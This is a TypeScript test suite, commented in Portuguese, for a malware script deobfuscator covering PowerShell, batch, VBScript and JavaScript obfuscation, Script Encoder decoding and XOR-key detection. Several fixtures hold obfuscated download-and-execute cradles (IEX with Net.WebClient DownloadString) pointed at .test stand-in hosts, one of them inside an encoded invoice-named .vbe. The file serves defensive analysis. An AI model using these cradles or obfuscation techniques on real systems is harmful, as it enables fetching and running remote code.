// Desofuscacao de scripts mais funda (plans/novas-analises, item 5): cada tecnica, sem banco.
import assert from 'node:assert/strict';
import { test } from 'node:test';

import { analyzeScript } from '../../src/lib/script-analysis';
import {
  decodeScriptEncoder,
  encodeScriptEncoder,
  flavorOf,
  normalizeScript,
  singleByteXor,
} from '../../src/lib/script-deobfuscate';

const ps = (text: string) => normalizeScript(text, 'powershell');

test('PowerShell: crase de escape sai, mas o `n de verdade fica', () => {
  const out = ps('I`E`X (Ne`w-Obj`ect Net.WebClient)');
  assert.equal(out.text, 'IEX (New-Object Net.WebClient)');
  assert.deepEqual(out.techniques, ['Crase de escape (PowerShell)']);
  assert.equal(ps('Write-Host "linha`n"').text, 'Write-Host "linha`n"');
});

test('PowerShell: concatenação de literais, também entre parênteses', () => {
  assert.equal(
    ps(".('Down'+'load'+\"String\")('ht'+'tp://a.test')").text,
    ".('DownloadString')('http://a.test')",
  );
  // Aspas duplas com variável não são literal: ficam.
  assert.equal(ps('"a$x" + \'b\'').text, '"a$x" + \'b\'');
});

test('PowerShell: operador -f com e sem parênteses, e índice que falta não muda nada', () => {
  assert.equal(ps("& (\"{1}{0}\" -f 'load','Down')").text, "& 'Download'");
  assert.equal(ps("\"{0}-{1}\" -f 'Invoke','Expression'").text, "'Invoke-Expression'");
  assert.equal(ps("\"{0}{3}\" -f 'a','b'").text, "\"{0}{3}\" -f 'a','b'");
});

test('PowerShell: [char], [char[]] -join e o pipe para [char]', () => {
  assert.equal(ps('[char]72+[char]0x69').text, "'Hi'");
  assert.equal(ps("[char[]](72,105) -join ''").text, "'Hi'");
  assert.equal(ps('-join ((72,105) | %{[char]$_})').text, "'Hi'");
  assert.equal(ps("((72,105) | ForEach-Object { [char] $_ }) -join ''").text, "'Hi'");
});

test('PowerShell: -replace (regex, sem diferenciar maiúsculas) e .Replace()', () => {
  assert.equal(ps("'hXXp://a.test' -replace 'xx','tt'").text, "'http://a.test'");
  assert.equal(ps("'hXXp' -creplace 'xx','tt'").text, "'hXXp'");
  assert.equal(ps("'a#b#c'.Replace('#','.')").text, "'a.b.c'");
  // Regex perigosa (quantificador aninhado) não roda.
  assert.equal(ps("'aaaa' -replace '(a+)+b',''").text, "'aaaa' -replace '(a+)+b',''");
});

test('PowerShell: texto invertido', () => {
  assert.equal(ps("-join 'gnirtS'[-1..-6]").text, "'String'");
  assert.equal(ps("('gnirtS'[-1..-20] -join '')").text, "'String'");
  assert.equal(ps("-join [regex]::Matches('gnirtS','.','RightToLeft')").text, "'String'");
});

test('PowerShell: variável atribuída uma vez com literal vira o valor', () => {
  const out = ps("$a='Down'; $b = 'load'; $c = \"$a$b\"; IEX $c");
  assert.match(out.text, /\$c = "Download"/);
  assert.ok(out.techniques.includes('Variável com valor fixo'));
  // Atribuída duas vezes: não é fixa.
  assert.equal(ps("$a='x'; $a='y'; Write $a").text, "$a='x'; $a='y'; Write $a");
  // Atribuída com outra coisa depois.
  assert.equal(ps("$a='x'; $a += 'y'; Write $a").text, "$a='x'; $a += 'y'; Write $a");
});

test('lote: circunflexo, set, fatias e substituição', () => {
  const out = normalizeScript(
    [
      '@echo off',
      'set a=pow',
      'set "b=ershell"',
      '%a%%b% -c whoami',
      'p^o^w^e^r^s^h^e^l^l -c hi',
      'echo "a^b"',
      '%COMSPEC:~-7,3% /c dir',
      'set x=HelloWorld',
      'echo %x:~5% %x:~0,-5% %x:o=0% %x:*l=_% !x!',
      'echo %naoexiste%',
    ].join('\r\n'),
    'batch',
  );
  const lines = out.text.split('\n');
  assert.equal(lines[3], 'powershell -c whoami');
  assert.equal(lines[4], 'powershell -c hi');
  assert.equal(lines[5], 'echo "a^b"');
  assert.equal(lines[6], 'cmd /c dir');
  assert.equal(lines[8], 'echo World Hello Hell0W0rld _loWorld HelloWorld');
  assert.equal(lines[9], 'echo %naoexiste%');
  assert.deepEqual(out.techniques.sort(), [
    'Circunflexo de escape (lote)',
    'Variáveis do lote (set, %var:~a,b%)',
  ]);
});

test('VBScript: Chr() no meio, &, StrReverse e Replace', () => {
  const out = normalizeScript(
    'Set o = CreateObject("WScr" & Chr(105) & "pt.Shell")\no.Run StrReverse("exe.dmc") & Replace("pXwershell","X","o")',
    'vbscript',
  );
  assert.equal(out.text, 'Set o = CreateObject("WScript.Shell")\no.Run "cmd.exepowershell"');
});

test('JavaScript: escapes \\x e \\u, concatenação, reverse e replace', () => {
  const out = normalizeScript(
    "var s = '\\x68\\u0074tp' + '://' + \"e.test\"; var r='exe.clac'.split('').reverse().join(''); var q='aZbZc'.replace(/Z/g,'')",
    'javascript',
  );
  assert.equal(out.text, "var s = 'http://e.test'; var r='calc.exe'; var q='abc'");
});

test('sabor pela linguagem e, numa camada, pelo conteúdo', () => {
  assert.equal(flavorOf('$a = 1', null), 'powershell');
  assert.equal(flavorOf('@echo off\nset a=1', null), 'batch');
  assert.equal(flavorOf('Dim a\nCreateObject("x")', null), 'vbscript');
  assert.equal(flavorOf('<script language="VBScript">', 'hta'), 'vbscript');
  assert.equal(flavorOf('var a = 1', 'javascript'), 'javascript');
});

test('Script Encoder: decodifica o que o screnc codifica, com os escapes @&, @!, @* e @$', () => {
  const plain = 'MsgBox "Olá <mundo> @ teste"\r\nWScript.Echo 1';
  assert.equal(decodeScriptEncoder(encodeScriptEncoder(plain)), plain);
  assert.equal(decodeScriptEncoder('sem bloco'), null);
});

test('XOR de um byte: acha a chave em bytes com cara de script e ignora texto comum', () => {
  const payload = Buffer.from("IEX (New-Object Net.WebClient).DownloadString('http://x.test/p')");
  const found = singleByteXor(payload.map((b) => b ^ 0x5a));
  assert.equal(found?.key, 0x5a);
  assert.equal(found?.text, payload.toString());
  assert.equal(singleByteXor(payload), null);
  assert.equal(singleByteXor(Buffer.alloc(64, 0x41)), null);
});

test('análise: .vbe codificado vira camada e os achados vêm dela', () => {
  const info = analyzeScript(
    Buffer.from(
      encodeScriptEncoder(
        'Set s = CreateObject("WScript.Shell")\ns.Run "powershell -w hidden IEX (New-Object Net.WebClient).DownloadString(\'http://vbe.test/x\')"',
      ),
    ),
    'fatura.vbe',
  );
  assert.equal(info?.encoded, true);
  assert.equal(info?.layers[0].method, 'Script Encoder (.vbe/.jse)');
  assert.ok(info?.urls.includes('http://vbe.test/x'));
  assert.equal(info?.findings.find((f) => f.name === 'WScript.Shell')?.layer, 1);
  assert.equal(info?.risk, 'high');
});

test('análise: a camada normalizada lista as técnicas e alimenta as regras', () => {
  const info = analyzeScript(
    Buffer.from(
      "$w = New-Object Net.WebClient\n$w.('Down'+'load'+'String')(\"{1}{0}\" -f 'ev.test/a','http://') | I`E`X\n",
    ),
    'a.ps1',
  );
  const layer = info?.layers[0];
  assert.equal(layer?.from, 0);
  assert.match(layer?.method ?? '', /Concatenação de literais/);
  assert.match(layer?.method ?? '', /Operador de formato -f/);
  assert.match(layer?.text ?? '', /\.\('DownloadString'\)\('http:\/\/ev\.test\/a'\) \| IEX/);
  assert.ok(info?.urls.includes('http://ev.test/a'));
  assert.equal(info?.findings.find((f) => f.name === 'Invoke-Expression (IEX)')?.layer, 1);
});

test('análise: XOR com chave fixa em Base64 vira camada', () => {
  const payload = Buffer.from(
    "IEX (New-Object Net.WebClient).DownloadString('http://xor.test/p')",
  ).map((b) => b ^ 0x5a);
  const info = analyzeScript(
    Buffer.from(
      `$k=0x5a; $b=[Convert]::FromBase64String('${Buffer.from(payload).toString('base64')}'); $d = $b | % { $_ -bxor $k }`,
    ),
    'x.ps1',
  );
  assert.ok(info?.layers.some((l) => l.method === 'XOR de um byte (chave 0x5a)'));
  assert.ok(info?.urls.includes('http://xor.test/p'));
});

test('normalização tem teto: texto enorme e repetitivo termina rápido', () => {
  const started = Date.now();
  for (const f of ['powershell', 'batch', 'vbscript', 'javascript'] as const) {
    normalizeScript(`'a'+`.repeat(50_000) + "'b'", f);
    normalizeScript("'".repeat(200_000), f);
    normalizeScript('%a:~1,2%^'.repeat(50_000), f);
  }
  assert.ok(Date.now() - started < 10_000, `${Date.now() - started} ms`);
});
